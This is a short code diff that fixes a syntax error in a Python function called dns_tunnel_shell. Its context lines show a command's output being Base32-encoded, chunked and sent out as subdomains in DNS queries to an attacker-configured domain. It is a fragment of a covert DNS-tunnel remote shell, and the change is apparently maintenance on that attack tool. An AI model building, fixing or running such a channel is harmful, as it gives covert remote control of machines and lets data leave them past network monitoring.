@@ -526,7 +526,7 @@ def dns_tunnel_shell():
                 # Fragment and send output via DNS queries
                 # Base32 encode to avoid invalid characters
                 encoded = base64.b32encode(result.encode()).decode().replace('=', '')
-                chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50]
+                chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
                 for i, chunk in enumerate(chunks):
                     output_domain = f"{chunk}.{i}.{command_id}.r.{DNS_DOMAIN}"
                     
